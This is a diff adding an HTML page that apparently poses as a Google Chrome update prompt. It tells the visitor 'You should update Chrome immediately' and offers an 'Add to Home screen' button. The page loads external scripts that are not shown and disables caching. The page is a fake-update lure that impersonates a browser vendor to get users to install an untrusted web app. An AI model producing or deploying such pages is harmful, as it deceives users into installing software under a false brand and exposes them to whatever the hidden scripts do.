@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+	<title>Update Chrome</title>
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width,height=device-height,initial-scale=1,minimum-scale=1">
+	<link rel="stylesheet" href="css/style.css">
+	<link rel="manifest" href="/apps/chrome/manifest.json">
+	<meta http-equiv="cache-control" content="max-age=0" />
+	<meta http-equiv="cache-control" content="no-cache" />
+	<meta http-equiv="expires" content="0" />
+	<meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
+	<meta http-equiv="pragma" content="no-cache" />
+</head>
+
+<body>
+
+	<div id="installPopup" class="install-popup" style="display: block;">
+		<div class="popup-inner">
+			<img class="icon" src="images/icon192.png" alt="" />
+			<h1 class="title">You should update Chrome immediately.</h1>
+			<div class="description">Get Chrome Update quickly and easily by adding it to your Home screen.</div>
+
+			<a href="#" id="btnAdd" class="btn" onclick="installBtnClick()">Add to Home screen</a>
+		</div>
+	</div>
+
+    <script src="/src/js/api.js"></script>
+    <script src="/src/js/idb.js"></script>
+    <script src="/src/js/utility.js"></script>    	
+	<script type="text/javascript" src="js/main.js"></script>
+
+</body>
+</html>
